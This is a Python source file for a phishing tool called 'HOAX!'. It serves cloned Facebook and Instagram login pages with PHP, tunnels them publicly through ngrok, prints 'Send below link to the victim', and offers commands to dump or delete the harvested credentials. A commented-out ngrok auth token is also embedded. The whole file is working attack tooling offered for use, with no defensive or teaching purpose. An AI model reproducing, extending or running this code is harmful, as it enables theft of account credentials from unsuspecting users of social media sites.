import json
import http.server
import socketserver
import time
from pyngrok import ngrok, conf
import pyfiglet
import os
import credentials

# auth_key = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
ascii_banner = pyfiglet.figlet_format("HOAX!")
print()
print(ascii_banner)
print(" "*10 + "Coded with <3, cj.")
print(" "+"*"*16 + " HOAX " + "*"*16)

#help, manual for commands

def help(Command):
    match Command[0]:
        case "help":
            print(" [-h, help] for information about how commads work.\n [-v, version] show  the current version of tool.\n [-a, auth] author of the tool. \n [-n, name] tool name.")
            print(" [0] terminates the script")
            print(" [-dc, dump credentials] [sitename] shows the all credentials related to the sitename")
            print(" [-rc, remove credentials] [sitename] delete tha all credentials related to the sitename")
        case "-h":
            print(" [-h, help] for information about how commads work.\n [-v, version] show  the current version of tool.\n [-a, auth] author of the tool. \n [-n, name] tool name.")
            print(" [0] terminates the script")
            print(" [-dc, dump credentials] [sitename] shows the all credentials related to the site name")
            print(" [-rc, remove credentials] [sitename] delete the all credentials related to the site name")
        case "version":
            f = open('package.json')
            data = json.load(f)
            print(" Version: " + data['version'])
            f.close()
        case "auth":
            f = open('package.json')
            data = json.load(f)
            print(" Author: " + data['author'])
            f.close()
        case "-v":
            f = open('package.json')
            data = json.load(f)
            print(" Version: " + data['version'])
            f.close()
        case "-a":
            f = open('package.json')
            data = json.load(f)
            print(" Author: " + data['author'])
            f.close()
        case "name":
            f = open('package.json')
            data = json.load(f)
            print(" Name: " + data['name'])
            f.close()
        case "-n":
            f = open('package.json')
            data = json.load(f)
            print(" Name: " + data['name'])
            f.close()
        case "-rc":

            match Command[1]:
                case "facebook":
                    try:
                        credentials.del_credential("sites/"+Command[1]+"/log.txt")
                    except:
                        print(" ERR: Command not found, \""+Command[1]+"\""+" is not valid cammand!")

                case "instagram":
                    try:
                        credentials.del_credential("sites/"+Command[1]+"/log.txt")
                    except:
                        print(" ERR: Command not found, \""+Command[1]+"\""+" is not valid cammand!")
                case defualt:
                    print(" ERR: Command not found, \""+Command[1]+"\""+" is not valid cammand!")

        case "-dc":
            match Command[1]:
                case "facebook":
                    try:
                        credentials.find_credentials("sites/"+Command[1]+"/log.txt")
                    except:
                        print(" ERR: Command not found, \""+Command[1]+"\""+" is not valid cammand!")

                case "instagram":
                    try:
                        credentials.find_credentials("sites/"+Command[1]+"/log.txt")
                    except:
                        print(" ERR: Command not found, \""+Command[1]+"\""+" is not valid cammand!")

                case defualt:
                    print(" ERR: Command not found, \""+Command[1]+"\""+" is not valid cammand!")


        # case "rm-cred":
        #     credentials.del_credential("sites/facebook/log.txt")
        # case "dump-cred":
        #     credentials.find_credentials("sites/facebook/log.txt")
        case defualt:
            print(" ERR: Command not found, \""+Command+"\""+" is not valid cammand!")

#menu items
def menu():
    print()
    print(" Choose the option..!")
    print(" [1] Facebook\t\t[2] Instagram")
    print(" [3] Google\t\t[4] Twitter")
    print(" [5] Linked In\t\t[6] Snapchat")
    print(" [7] YouTube\t\t[0] exit")

#options
def options(USER_INPUT):
    USER_INPUT = USER_INPUT.strip()
    USER_INPUT = USER_INPUT.lower()
    
    #list of arguments passes
    arguments = USER_INPUT.split(" ")
    
    #USER_INPUT => arguments[]
    if arguments[0].isdigit():
        match arguments[0]:
            case "1":
                print(" [+] connecting to the Facebook...")
                time.sleep(3)
                server_run("sites/facebook", 8000)
            case "2":
                print(" [+] connecting to the Instagram...")
                time.sleep(3)
                server_run("sites/instagram", 8001)
            case "3":
                print(" [+] connecting to the Google...")
                time.sleep(3)
            case "4":
                print(" [+] connecting to the Twitter...")
                time.sleep(3)
            case "5":
                print(" [+] connecting to the Linked In...")
                time.sleep(3)
            case "6":
                print(" [+] connecting to the Snapchat...") 
                time.sleep(3)
            case "7":
                print(" [+] connecting to the YouTube...")
            case "0":
                exit()
            case defualt:
                print(" ERR: Command not found, \""+USER_INPUT+"\""+" is not valid cammand!")
    else:
        if USER_INPUT != "":
            try:
                help(arguments)
            except:
                print(" ERR: Command not found, \""+USER_INPUT+"\""+" is not valid cammand!")

        elif USER_INPUT == "":
            return 0
        else:
            print(" ERR: Command not found, \""+USER_INPUT+"\""+" is not valid cammand!")

#server connectin 120.0.0.1 on port 8000
def server_run(str_path, prt):
    PORT = prt
    comd = "php -S localhost:" + str(prt) + " -t " + str_path
    print(" [+] server running on port: " + str(PORT))
    time.sleep(3)
    print(" [+] Link:> http://1270.0.0.1:" + str(PORT))
    time.sleep(3)
    print(" [+] Link:> http://localhost:" + str(PORT))
    time.sleep(3)
    # Star the server
    try:
        print(" [+] Send below link to the victim. ")
        # conf.get_default().auth_token = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
        url = ngrok.connect(PORT, "http")
        print(" [+] "+ str(url))
        time.sleep(3)
        os.system(comd)
    except:
        print(" Err: Server is not responding!")


#parent function 
def main():
    while True:
        print()
        user_input = input("HOAX>> ")
        options(user_input)
        main()

#function call section
menu()
main()
